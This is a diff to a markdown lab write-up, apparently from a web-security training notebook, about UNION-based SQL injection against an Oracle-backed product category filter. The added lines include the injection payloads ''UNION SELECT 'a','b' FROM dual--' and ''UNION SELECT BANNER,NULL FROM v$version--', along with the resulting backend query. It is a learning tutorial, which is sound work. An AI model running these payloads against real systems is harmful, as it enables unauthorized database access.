@@ -70,7 +70,7 @@ If `ORDER BY 3` fails, query has 2 columns.
 
 That  `ORDER BY 3` fails, query has 2 columns.
 
-it's Mean We assume Right Backend Query The have only Two Columns First is `name` and Second is `description` !!
+it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!
 
 ```
 SELECT name,description FROM products WHERE category = 'Gifts'
@@ -78,14 +78,36 @@ SELECT name,description FROM products WHERE category = 'Gifts'
 
 <figure><img src="../../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+Also We Use.There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual` if it's Return Content It's Mean First Column is String !!
+
+
+
+Let's We Use In Our Two Column Table !!
+
+```
+'UNION SELECT 'a','b' FROM dual--
+```
+
+Our Backend Code Look's Like This After Injecting This Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts'
+UNION
+SELECT 'a','b' FROM dual
+```
+
+Then See If Our First and Second  Both Column is String They Return No Error !!&#x20;
 
 <figure><img src="../../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+When We Use `Integer` Value They Return Error It's Mean There is `No Integer` Value In Column !!
 
 <figure><img src="../../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+Use the following payload to display the database version:
+
+```
+'UNION SELECT BANNER,NULL FROM v$version--
+```
 
 <figure><img src="../../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>
